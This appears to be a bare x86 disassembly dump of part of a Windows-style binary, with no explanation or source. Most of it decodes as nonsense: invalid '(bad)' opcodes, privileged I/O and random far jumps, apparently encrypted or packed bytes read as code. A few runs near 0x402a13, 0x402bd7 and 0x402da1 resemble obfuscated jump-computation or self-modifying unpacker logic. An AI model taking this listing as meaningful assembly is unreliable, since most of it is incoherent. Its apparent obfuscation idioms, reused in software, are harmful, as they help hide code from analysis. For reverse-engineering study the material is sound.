  402914:	aam    0x21
  402916:	sub    ebp,DWORD PTR [edi]
  402918:	cmp    ecx,DWORD PTR ds:0xf165cb19
  40291e:	jmp    0xae70b7da
  402923:	push   esi
  402924:	daa    
  402925:	push   es
  402926:	test   BYTE PTR [ebx+ecx*2-0x4c0b7869],dl
  40292d:	xchg   esp,eax
  40292e:	sar    ch,0x9a
  402931:	cmc    
  402932:	gs pusha 
  402934:	stos   BYTE PTR es:[edi],al
  402935:	adc    DWORD PTR [edx+0x27b47864],edx
  40293b:	out    0x87,eax
  40293d:	mov    ecx,eax
  40293f:	(bad)  
  402941:	test   DWORD PTR [esi+0xb405cb2],0xd32c5bc8
  40294b:	aam    0x78
  40294d:	xchg   edi,eax
  40294e:	(bad)  
  402951:	test   DWORD PTR [edi+0x6b],eax
  402954:	mov    cl,0x42
  402956:	add    DWORD PTR ss:[ecx+0x3eff2ea3],0x59
  40295e:	push   0xd92ed765
  402963:	imul   ecx,DWORD PTR [edi-0x3d],0xfe4b95d4
  40296a:	out    0x7f,eax
  40296c:	cmp    ah,bl
  40296e:	fnstenv [esi+0x14]
  402971:	add    ch,0x88
  402974:	adc    al,BYTE PTR [edx]
  402976:	push   0xe9b6892a
  40297b:	or     al,0xab
  40297d:	loopne 0x402954
  40297f:	xor    DWORD PTR [edi+edx*4-0x52],ecx
  402983:	mov    edx,0xd0575945
  402988:	icebp  
  402989:	in     al,dx
  40298a:	ins    BYTE PTR es:[edi],dx
  40298b:	and    BYTE PTR [edi],0x73
  40298e:	cmp    al,0xfa
  402990:	jmp    0xa10b:0x716bb763
  402997:	ds pushf 
  402999:	pop    esp
  40299a:	inc    esp
  40299b:	fstp   TBYTE PTR [esi-0x7d]
  40299e:	jo     0x402a0f
  4029a0:	xchg   ebp,eax
  4029a1:	lods   eax,DWORD PTR ds:[esi]
  4029a2:	jo     0x402a13
  4029a4:	mov    al,ds:0x3720ac25
  4029a9:	jb     0x402980
  4029ab:	sub    DWORD PTR [ebx+0x41],ebx
  4029ae:	push   0xffffffdf
  4029b0:	xchg   DWORD PTR [esp+esi*4],edx
  4029b3:	(bad)  
  4029b4:	sbb    BYTE PTR [bx+di-0x54],dh
  4029b8:	call   DWORD PTR [eax+0x1c]
  4029bb:	retf   0xc71f
  4029be:	int3   
  4029bf:	or     BYTE PTR [esi],dh
  4029c1:	mov    dh,0xc9
  4029c3:	mov    cl,0x82
  4029c5:	dec    edx
  4029c6:	dec    bl
  4029c8:	shr    BYTE PTR [eax],0x2e
  4029cb:	loop   0x4029a3
  4029cd:	cs mov esi,0xe3063a07
  4029d3:	cmp    esi,ebx
  4029d5:	(bad)  
  4029d7:	add    BYTE PTR [esp+edi*2-0x60],0x5
  4029dc:	jnp    0x402a4a
  4029de:	lds    edi,FWORD PTR [si-0x16]
  4029e2:	mov    BYTE PTR ss:[bp+si+0x54],dl
  4029e7:	jae    0x4029ee
  4029e9:	jno    0x4029ae
  4029eb:	push   es
  4029ec:	mov    gs,WORD PTR [ecx]
  4029ee:	shr    bh,cl
  4029f0:	mov    gs,WORD PTR [ebp+0x25]
  4029f3:	dec    esp
  4029f4:	pop    edi
  4029f5:	jle    0x402991
  4029f7:	jo     0x402a51
  4029f9:	in     eax,dx
  4029fa:	jecxz  0x402a15
  4029fc:	mov    edx,0x3463cac
  402a01:	imul   DWORD PTR [edi-0x77274599]
  402a07:	and    eax,DWORD PTR ds:0xd2f6608f
  402a0d:	push   ecx
  402a0e:	js     0x402a00
  402a10:	sub    DWORD PTR [edi-0x4d],edi
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	adc    al,0xc2
  402a36:	repnz cmp BYTE PTR [edx-0x58181f3],ch
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a9f
  402a41:	xchg   edx,eax
  402a42:	sub    DWORD PTR [edx],edx
  402a44:	adc    ch,BYTE PTR [ecx+0x79]
  402a47:	sahf   
  402a48:	dec    esi
  402a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4a:	xor    esp,DWORD PTR [edx+0x4a]
  402a4d:	jmp    0x1fcd218c
  402a52:	loopne 0x402aa8
  402a54:	xor    eax,0xe87e32b2
  402a59:	push   es
  402a5a:	lods   eax,DWORD PTR ds:[esi]
  402a5b:	pop    es
  402a5c:	or     DWORD PTR [ebx+0x74],eax
  402a5f:	(bad)  
  402a60:	and    DWORD PTR [ebx+0x2eef035f],ebp
  402a66:	clc    
  402a67:	int    0x1e
  402a69:	dec    eax
  402a6a:	or     esp,DWORD PTR [edi-0x2c75f099]
  402a70:	xor    al,0xf3
  402a72:	loope  0x402a28
  402a74:	push   0xac6d3aab
  402a79:	icebp  
  402a7a:	adc    al,bl
  402a7c:	inc    edx
  402a7d:	ins    BYTE PTR es:[edi],dx
  402a7e:	pusha  
  402a7f:	and    ecx,edi
  402a81:	das    
  402a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a83:	xor    ecx,DWORD PTR [ebp-0x4474d32f]
  402a89:	cld    
  402a8a:	jmp    0x66d8:0xb01f155
  402a91:	loopne 0x402ab1
  402a93:	stc    
  402a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a95:	into   
  402a96:	outs   dx,DWORD PTR ds:[esi]
  402a97:	out    0x1,al
  402a99:	adc    BYTE PTR ds:0xb665b65c,0x5a
  402aa0:	ja     0x402a71
  402aa2:	aaa    
  402aa3:	cmp    ch,BYTE PTR [ebx+0x362d8835]
  402aa9:	mov    eax,0xfe1faada
  402aae:	(bad)  
  402aaf:	test   BYTE PTR [esi-0x5d81359f],ch
  402ab5:	mov    ds,ebp
  402ab7:	test   DWORD PTR [esi],esp
  402ab9:	in     al,0x48
  402abb:	inc    eax
  402abc:	sbb    edi,DWORD PTR [ebx-0x72358fe2]
  402ac2:	mov    esp,0xaf85c4ed
  402ac7:	(bad)  
  402ac8:	in     eax,dx
  402ac9:	xchg   DWORD PTR [edi],ebx
  402acb:	dec    ecx
  402acc:	xchg   ebp,eax
  402acd:	mov    ebp,0xc06ebb1c
  402ad2:	or     al,0xda
  402ad4:	pop    esp
  402ad5:	sub    al,0x51
  402ad7:	jge    0x402a7a
  402ad9:	and    al,0x8d
  402adb:	mov    bh,0x33
  402add:	inc    esp
  402ade:	pop    ds
  402adf:	arpl   WORD PTR [esi],ax
  402ae1:	sub    BYTE PTR [eax+ebp*8],ah
  402ae4:	xchg   ebp,eax
  402ae5:	shr    BYTE PTR [ebx],1
  402ae7:	mov    WORD PTR [ebx+0x7e],?
  402aea:	ret    0x8d07
  402aed:	cwde   
  402aee:	push   ss
  402aef:	push   cs
  402af0:	scas   eax,DWORD PTR es:[edi]
  402af1:	xor    al,0x3d
  402af3:	adc    BYTE PTR [ebp+0x211bf64c],bh
  402af9:	inc    ebx
  402afa:	pop    edi
  402afb:	add    bl,BYTE PTR [ecx]
  402afd:	jle    0x402afc
  402aff:	rep lods al,BYTE PTR ds:[esi]
  402b01:	mov    dh,BYTE PTR [edi]
  402b03:	xor    BYTE PTR [edx-0x78],cl
  402b06:	test   DWORD PTR [edx+0x49f7b74b],edx
  402b0c:	push   edx
  402b0d:	jae    0x402b36
  402b0f:	pop    esi
  402b10:	or     edi,DWORD PTR [edx+0x6820b4c9]
  402b16:	(bad)  
  402b17:	not    DWORD PTR [edi+0x2943534b]
  402b1d:	outs   dx,BYTE PTR ds:[esi]
  402b1e:	push   edi
  402b1f:	jge    0x402b81
  402b21:	mov    bh,0xc
  402b23:	in     al,dx
  402b24:	mov    esp,ecx
  402b26:	add    ebp,ecx
  402b28:	mov    dh,0x8c
  402b2a:	dec    ebx
  402b2b:	cwde   
  402b2c:	cmp    edi,esi
  402b2e:	add    eax,0x8b3d1664
  402b33:	fadd   st(0),st
  402b35:	mov    ch,0xe7
  402b37:	dec    BYTE PTR [ecx+0x62044fab]
  402b3d:	ret    0x8f7
  402b40:	xor    DWORD PTR [eax-0x1ddf37c6],eax
  402b46:	bound  ebp,QWORD PTR ds:0xb54464b1
  402b4c:	jno    0x402ae7
  402b4e:	mov    ecx,gs
  402b50:	xchg   bh,dh
  402b52:	es xchg esi,eax
  402b54:	sub    ah,BYTE PTR [edx+0x169028c]
  402b5a:	xor    ah,BYTE PTR [eax]
  402b5c:	test   esi,0x7de10f83
  402b62:	fstp   TBYTE PTR [ebp+edx*4+0xe]
  402b66:	adc    DWORD PTR [esi-0x4e],ebx
  402b69:	dec    eax
  402b6a:	jne    0x402b66
  402b6c:	es inc edx
  402b6e:	daa    
  402b6f:	ja     0x402ba9
  402b71:	not    BYTE PTR [ecx+0x48933549]
  402b77:	iret   
  402b78:	lods   al,BYTE PTR ds:[esi]
  402b79:	jno    0x402b99
  402b7b:	jmp    0x402bb1
  402b7d:	sub    al,BYTE PTR [esi]
  402b7f:	jg     0x402b78
  402b81:	dec    BYTE PTR [esp+ecx*8-0x3]
  402b85:	lahf   
  402b86:	cmc    
  402b87:	and    DWORD PTR [esi+0x51],eax
  402b8a:	popa   
  402b8b:	mov    al,0xb9
  402b8d:	(bad)  
  402b8e:	mov    edx,0xe57cf05e
  402b93:	adc    BYTE PTR [edi+0x62],0x23
  402b97:	inc    edx
  402b98:	mov    edx,0x5fd57d6f
  402b9d:	push   0x2088bb57
  402ba2:	sub    bl,BYTE PTR [edi-0x5192adef]
  402ba8:	or     edx,DWORD PTR [ebx]
  402baa:	sub    eax,0x31bd65fe
  402baf:	popf   
  402bb0:	push   edx
  402bb1:	mov    ah,0xa3
  402bb3:	mov    dh,al
  402bb5:	cmp    ecx,DWORD PTR [esi+0x6ba9d698]
  402bbb:	jmp    0xbe22:0xb5dd11f5
  402bc2:	cmp    eax,0xfc08563
  402bc7:	test   BYTE PTR [eax],ch
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	push   esi
  402c12:	push   esi
  402c13:	fbld   TBYTE PTR [esi+esi*1+0xb]
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c65
  402c1e:	fnstcw WORD PTR [esi-0x54]
  402c21:	mov    ah,0x60
  402c23:	cmp    BYTE PTR [ebx],al
  402c25:	out    dx,eax
  402c26:	mov    ds:0xf6be9944,al
  402c2b:	cld    
  402c2c:	ins    DWORD PTR es:[edi],dx
  402c2d:	xlat   BYTE PTR ds:[ebx]
  402c2e:	pop    edi
  402c2f:	cmc    
  402c30:	jae    0x402c78
  402c32:	dec    ebx
  402c33:	imul   ebx,DWORD PTR [ebp-0x662880a9],0x796cc0b3
  402c3d:	test   eax,0x2481f49b
  402c42:	sbb    eax,0x7310c342
  402c47:	mov    ds:0xf0da16ec,al
  402c4c:	inc    bx
  402c4e:	je     0x402c12
  402c50:	scas   al,BYTE PTR es:[edi]
  402c51:	es xchg esp,eax
  402c53:	mov    ah,0xdf
  402c55:	icebp  
  402c56:	dec    ebx
  402c57:	mov    ss,ebp
  402c59:	push   edi
  402c5a:	add    al,0x41
  402c5c:	mov    eax,ds:0x830427d0
  402c61:	pop    ecx
  402c62:	push   edi
  402c63:	mov    ebp,0x6904b74
  402c68:	into   
  402c69:	dec    esi
  402c6a:	rcl    BYTE PTR [ecx],0xd1
  402c6d:	repz fs aam 0xe9
  402c71:	add    DWORD PTR [edx+0x4dbb956a],0xffffffbb
  402c78:	loopne 0x402c1a
  402c7a:	lods   eax,DWORD PTR ds:[esi]
  402c7b:	lock sub DWORD PTR [ecx+esi*1-0x675c5e38],edx
  402c83:	fsubp  st(7),st
  402c85:	mov    dl,0x67
  402c87:	and    al,0x91
  402c89:	ins    BYTE PTR es:[edi],dx
  402c8a:	scas   eax,DWORD PTR es:[edi]
  402c8b:	xor    al,0x5c
  402c8e:	outs   dx,DWORD PTR ds:[esi]
  402c8f:	ss xor al,0x3f
  402c92:	cmp    esp,DWORD PTR [eax]
  402c94:	xor    cl,ah
  402c96:	rcl    BYTE PTR [edx+0x14],1
  402c99:	icebp  
  402c9a:	pushf  
  402c9b:	pop    edx
  402c9c:	shr    DWORD PTR [edi],cl
  402c9e:	retf   
  402c9f:	nop
  402ca0:	add    BYTE PTR [edi+0xf],ch
  402ca3:	pop    eax
  402ca4:	mov    ecx,0xed46c238
  402ca9:	pop    ss
  402caa:	jbe    0x402cbe
  402cac:	ret    0x3f02
  402caf:	xchg   DWORD PTR [esi-0x59],ebp
  402cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb3:	mov    eax,0xb01bff47
  402cb8:	in     al,dx
  402cb9:	rcr    al,cl
  402cbb:	cmp    DWORD PTR [ebx-0x39],0x8d17c57d
  402cc2:	cmc    
  402cc3:	fmul   st,st(5)
  402cc5:	aam    0xa7
  402cc7:	dec    esi
  402cc8:	and    eax,0xbaa42432
  402ccd:	int3   
  402cce:	rcr    DWORD PTR [ebx-0x4a2562f6],cl
  402cd4:	push   esi
  402cd5:	mov    eax,0x7ea92de0
  402cda:	xor    dl,ch
  402cdc:	aaa    
  402cdd:	push   esi
  402cde:	stos   BYTE PTR es:[edi],al
  402cdf:	xor    dh,0x4e
  402ce2:	rcl    DWORD PTR [ebp+0x6f32d240],1
  402ce8:	add    al,0xde
  402cea:	call   DWORD PTR [eax]
  402cec:	add    al,0xca
  402cee:	mov    edi,0x2f1e60eb
  402cf3:	pop    ss
  402cf4:	dec    eax
  402cf5:	xchg   BYTE PTR [ecx-0x25],cl
  402cf8:	imul   BYTE PTR [esp+edi*2-0x6a06b1d8]
  402cff:	rol    BYTE PTR [ecx+0x72c828dd],0x34
  402d06:	aaa    
  402d07:	stc    
  402d08:	popf   
  402d09:	xchg   ecx,eax
  402d0a:	or     ecx,DWORD PTR [ecx-0x1f090ee3]
  402d10:	loope  0x402d5f
  402d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d13:	ror    DWORD PTR [esi],cl
  402d15:	pop    edi
  402d16:	push   esp
  402d17:	neg    DWORD PTR [eax+ebx*8]
  402d1a:	pop    ebp
  402d1b:	out    dx,eax
  402d1c:	call   0x22aeca23
  402d21:	leave  
  402d22:	dec    esp
  402d23:	imul   esi,ebx,0xea057776
  402d29:	js     0x402d19
  402d2b:	lods   eax,DWORD PTR ds:[esi]
  402d2c:	add    esp,0xea43067c
  402d32:	mov    eax,0x6615f4a3
  402d37:	push   esi
  402d38:	lock dec edi
  402d3a:	ja     0x402d13
  402d3c:	xlat   BYTE PTR ds:[ebx]
  402d3d:	test   DWORD PTR [edx-0x74],edx
  402d40:	ficom  WORD PTR [eax+0x72e5b783]
  402d46:	(bad)  
  402d48:	xchg   DWORD PTR [esi-0x60633ac],esi
  402d4e:	or     al,0x7
  402d50:	add    ebp,ebp
  402d52:	mov    bl,ah
  402d54:	ror    DWORD PTR [ecx],cl
  402d56:	adc    BYTE PTR [ebx+0x3918fa0d],bl
  402d5c:	xchg   BYTE PTR [ecx-0x58fae751],al
  402d62:	adc    BYTE PTR es:[edx-0x7f637fdb],bh
  402d69:	pop    edi
  402d6a:	cmp    BYTE PTR [edx+0x62419157],bh
  402d70:	mov    cl,0xb9
  402d72:	rcr    esi,0xc1
  402d75:	mov    eax,DWORD PTR [edx+edi*4]
  402d78:	js     0x402d68
  402d7a:	test   BYTE PTR [esi],bl
  402d7c:	or     al,0xc5
  402d7e:	lds    esp,FWORD PTR [edi]
  402d80:	(bad)  
  402d81:	int3   
  402d82:	xor    BYTE PTR [edi-0x58],bl
  402d85:	mov    al,0x2a
  402d87:	ret    
  402d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d89:	xor    eax,0x681ee1a1
  402d8e:	daa    
  402d8f:	outs   dx,DWORD PTR ds:[esi]
  402d90:	push   ds
  402d91:	pusha  
  402d92:	dec    esi
  402d93:	cmp    BYTE PTR [edx],dh
  402d95:	sub    al,0xb6
  402d97:	leave  
  402d98:	repz push ds
  402d9a:	xor    edx,edx
  402d9c:	add    BYTE PTR [eax+0x47],cl
  402d9f:	sbb    al,0x12
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+edi*2-0x2c],1
  402de7:	adc    al,0xf
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e02
  402df2:	sub    BYTE PTR [ebp+0x4d],al
  402df5:	stos   BYTE PTR es:[edi],al
  402df6:	or     cl,BYTE PTR [edx-0x29]
  402df9:	sbb    ecx,0xa8cf58e3
  402dff:	mov    ds:0x707cd7da,al
  402e04:	repz (bad) 
  402e07:	test   esp,edi
  402e09:	jbe    0x402e27
  402e0b:	sbb    DWORD PTR [esi+0x20732999],eax
  402e11:	shl    BYTE PTR [esi*1+0x5bf9d55a],1
  402e18:	into   
  402e19:	and    eax,DWORD PTR [ebp+0x22172574]
  402e1f:	rcr    DWORD PTR [ebx-0x346b7de1],1
  402e25:	cmp    al,ah
  402e27:	or     BYTE PTR [edx],al
  402e29:	jno    0x402e97
  402e2b:	aas    
  402e2c:	push   ecx
  402e2e:	hlt    
  402e2f:	sahf   
  402e30:	out    dx,eax
  402e31:	pop    ebp
  402e32:	mov    dl,BYTE PTR [edx+edi*2-0x64]
  402e36:	push   ebx
  402e37:	ret    
  402e38:	aas    
  402e39:	mov    edi,0xb8e11d9a
  402e3e:	push   edi
  402e3f:	jb     0x402e17
  402e41:	sub    al,0xd9
  402e43:	xchg   esp,eax
  402e44:	jecxz  0x402e14
  402e46:	ret    
  402e47:	lea    ebp,[ebx+0xd]
  402e4a:	fsub   DWORD PTR [ebx+0x2c]
  402e4d:	ss jp  0x402ddc
  402e50:	xchg   ebp,eax
  402e51:	ins    DWORD PTR es:[edi],dx
  402e52:	cli    
  402e53:	aam    0x7b
  402e55:	hlt    
  402e56:	retf   0xed69
  402e59:	out    0x6e,al
  402e5b:	out    dx,eax
  402e5c:	cmp    cl,BYTE PTR [eax+edi*2+0x4290faa5]
  402e63:	hlt    
  402e64:	xor    BYTE PTR [eax],dl
  402e66:	test   eax,0x5c83d254
  402e6b:	xor    al,0x65
  402e6d:	pop    edi
  402e6e:	adc    DWORD PTR [edx-0x26],ebp
  402e71:	cdq    
  402e72:	std    
  402e73:	call   0x5342:0x2a0b970a
  402e7a:	mov    esp,0x4becf9b5
  402e7f:	call   0x37e6f7ca
  402e84:	dec    edx
  402e85:	call   0xd670:0x40dd76dc
  402e8c:	fiadd  WORD PTR [edi+0xf051020]
  402e92:	or     BYTE PTR [edx-0x34],ch
  402e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e96:	push   0xf7812467
  402e9b:	outs   dx,BYTE PTR ds:[esi]
  402e9c:	xchg   BYTE PTR [eax+0x1ec3e2bb],bl
  402ea2:	xlat   BYTE PTR ds:[ebx]
  402ea3:	add    edi,DWORD PTR [esi+esi*8-0x50]
  402ea7:	pushf  
  402ea8:	jl     0x402e67
  402eaa:	push   ebp
  402eab:	rcl    DWORD PTR [eax-0x4d],1
  402eae:	sbb    DWORD PTR [ebp-0xf2b0e41],ebp
  402eb4:	cmp    ebx,edx
  402eb6:	test   cl,0x27
  402eb9:	and    edx,DWORD PTR [edi+0x6738a71]
  402ebf:	or     al,0xba
  402ec1:	cmc    
  402ec2:	sub    BYTE PTR [ebx+0x2310ad5f],bh
  402ec8:	or     al,BYTE PTR [edx+0x788c1a1b]
  402ece:	or     al,cl
  402ed0:	bound  edx,QWORD PTR [eax-0x63d7cf5d]
  402ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed7:	out    dx,al
  402ed8:	dec    ebx
  402ed9:	int3   
  402eda:	mov    eax,ds:0x4deab6f4
  402edf:	lods   al,BYTE PTR ds:[esi]
  402ee0:	pop    edi
  402ee1:	cs push 0x80abe7d9
  402ee7:	or     DWORD PTR [edi],eax
  402ee9:	or     bl,ch
  402eeb:	jne    0x402ee5
  402eed:	enter  0xbb84,0xaa
  402ef1:	adc    eax,0x45417ed4
  402ef6:	fsub   st(5),st
  402ef8:	adc    bl,al
  402efa:	imul   edx,DWORD PTR [ecx],0x6
  402efd:	push   esi
  402efe:	ins    BYTE PTR es:[edi],dx
  402eff:	jge    0x402eb6
  402f01:	lods   al,BYTE PTR ds:[esi]
  402f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f03:	scas   eax,DWORD PTR es:[edi]
  402f04:	push   ebx
  402f05:	xchg   edi,eax
  402f06:	mov    ds:0x681ee410,eax
  402f0b:	mov    esp,0x3089b140
  402f10:	or     al,0xc3
  402f12:	and    ah,cl
  402f14:	outs   dx,DWORD PTR ds:[esi]
  402f15:	xchg   ecx,eax
  402f16:	mov    cl,0x73
  402f18:	mul    DWORD PTR [eax-0x76]
  402f1b:	stos   BYTE PTR es:[edi],al
  402f1c:	int3   
  402f1d:	sub    si,WORD PTR [edx*4-0x2195139c]
  402f25:	push   es
  402f26:	mov    dl,0xa8
  402f28:	pop    ds
  402f29:	dec    esp
  402f2a:	xor    eax,0xf048379b
  402f2f:	adc    DWORD PTR [esi-0xe488839],esp
  402f35:	cli    
  402f36:	or     DWORD PTR [esi],eax
  402f38:	add    bh,BYTE PTR [eax+0x4d]
  402f3b:	cmp    eax,0x33104050
  402f40:	cmp    esi,ebp
  402f42:	shl    BYTE PTR [edx+0x2c713b2c],0x94
  402f49:	push   cs
  402f4a:	xchg   ebp,eax
  402f4b:	mov    ecx,0x9f1dd56a
  402f50:	ss mov ebx,0x9c441051
  402f56:	push   es
  402f57:	adc    eax,0xc16054b9
  402f5c:	jle    0x402ede
  402f5e:	stos   BYTE PTR es:[edi],al
  402f5f:	int3   
  402f60:	cmp    DWORD PTR [edx+0xd],edi
  402f63:	test   BYTE PTR [ecx],cl
  402f65:	ret    
  402f66:	stos   DWORD PTR es:[edi],eax
  402f67:	mov    DWORD PTR [esp+esi*1],0x10094996
  402f6e:	loopne 0x402ef6
  402f70:	fwait
  402f71:	stos   DWORD PTR es:[edi],eax
  402f72:	aam    0xb6
  402f74:	adc    DWORD PTR [ebp+0x413c0c05],ecx
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x78c5a5b7]
  402fae:	cmc    
  402faf:	inc    edi
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402fef
  402fb9:	inc    edi
  402fba:	mov    dl,0xdd
  402fbc:	cmp    BYTE PTR [edx],al
  402fbe:	xchg   edx,eax
  402fbf:	adc    BYTE PTR [edi+edi*1-0x73befad],dl
  402fc6:	xchg   edi,eax
  402fc7:	and    ebp,DWORD PTR [edx-0x40af3126]
  402fcd:	jo     0x402f5d
  402fcf:	int    0x50
  402fd1:	aam    0xb9
  402fd3:	xor    bh,BYTE PTR [edx-0x23c78c86]
  402fd9:	inc    edx
  402fda:	cmp    eax,0xf3dd673f
  402fdf:	loope  0x402fdf
  402fe1:	mov    ds:0x48c5d1c3,al
  402fe6:	cmp    BYTE PTR [edx-0x70],0xe7
  402fea:	test   BYTE PTR [edi+0x6f55de46],bh
  402ff0:	jno    0x403030
  402ff2:	jmp    ecx
  402ff4:	adc    DWORD PTR [esi],esp
  402ff6:	inc    BYTE PTR [edx]
  402ff8:	mov    ss,WORD PTR [ecx]
  402ffa:	push   esp
  402ffb:	in     eax,dx
  402ffc:	push   esp
  402ffd:	mov    ds,ebp
  402fff:	inc    esp
  403000:	xchg   esp,eax
  403001:	xor    bl,BYTE PTR [ebx+ecx*2]
  403004:	mov    al,ds:0x74ca7e82
  403009:	xor    ecx,DWORD PTR [ebp+0xe]
  40300c:	mov    dh,0x2c
  40300e:	jmp    0xfd824c2f
  403013:	push   es
  403014:	mov    dh,cl
  403016:	(bad)  
  403017:	xchg   ebx,eax
  403018:	sub    al,ch
  40301a:	mov    WORD PTR [ebx-0x3a7ae0cb],?
  403020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403021:	add    BYTE PTR [esi+0x7a],al
  403024:	(bad)  
  403025:	ins    BYTE PTR es:[edi],dx
  403026:	sahf   
  403027:	pop    ebx
  403028:	sti    
  403029:	fdivr  DWORD PTR [edx-0x173c4716]
  40302f:	mov    ds:0x4ecb07db,eax
  403034:	xor    al,0xa7
  403036:	pop    edx
  403037:	enter  0x4b20,0x5e
  40303b:	push   0x4493a5fd
  403040:	icebp  
  403041:	scas   eax,DWORD PTR es:[edi]
  403042:	pop    ecx
  403043:	pop    ecx
  403044:	mov    ecx,0xaa01bc8d
  403049:	mov    ebx,0x7c3d2c86
  40304e:	(bad)
  403051:	xchg   ecx,eax
  403052:	test   DWORD PTR [eax+0x2adfacbc],esi
  403058:	(bad)  
  403059:	push   ss
  40305a:	adc    BYTE PTR [edx+0x257fe3ca],cl
  403060:	push   esp
  403061:	xchg   ebp,eax
  403062:	(bad)  
  403063:	adc    cl,cl
  403065:	fs shr al,cl
  403068:	xchg   bh,dl
  40306a:	in     eax,0x28
  40306c:	scas   eax,DWORD PTR es:[edi]
  40306d:	out    0x45,eax
  40306f:	xchg   edx,eax
  403070:	mov    WORD PTR [esi-0x1c],?
  403073:	fwait
  403074:	shl    BYTE PTR [esi],1
  403076:	jo     0x403069
  403078:	inc    esi
  403079:	sbb    DWORD PTR [ecx+0x7ed47977],0x6b
  403080:	out    0x95,eax
  403082:	mov    cl,BYTE PTR [eax+0x78e1e8a8]
  403088:	iret   
  403089:	fwait
  40308a:	iret   
  40308b:	ins    DWORD PTR es:[edi],dx
  40308c:	inc    esi
  40308d:	shr    BYTE PTR [edx+0x3c7c6b99],cl
  403093:	jmp    0x4030df
  403095:	in     al,0x50
  403097:	dec    edi
  403098:	or     BYTE PTR [eax+0x21153e60],ah
  40309e:	dec    edx
  40309f:	pusha  
  4030a0:	pop    eax
  4030a1:	mov    dl,0xdf
  4030a3:	pop    ebp
  4030a4:	ret    
  4030a5:	cmp    DWORD PTR [esp+edi*8],ebx
  4030a8:	pop    esp
  4030a9:	xchg   esi,eax
  4030aa:	push   eax
  4030ab:	stos   DWORD PTR es:[edi],eax
  4030ac:	shl    DWORD PTR [ebp+0x2048c59a],cl
  4030b2:	inc    ebx
  4030b3:	or     edx,DWORD PTR [eax-0x65]
  4030b6:	sub    eax,0x123548f1
  4030bb:	ret    0x3f52
  4030be:	push   edx
  4030bf:	xchg   edx,eax
  4030c0:	inc    ebx
  4030c1:	lods   eax,DWORD PTR ds:[esi]
  4030c2:	and    eax,0xfe31d285
  4030c7:	mov    ebp,0xf7dc3706
  4030cc:	jmp    0x403096
  4030ce:	fild   DWORD PTR [ebx+0x26cbcafa]
  4030d4:	pop    ss
  4030d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030d6:	bound  esp,QWORD PTR [esi]
  4030d8:	cwde   
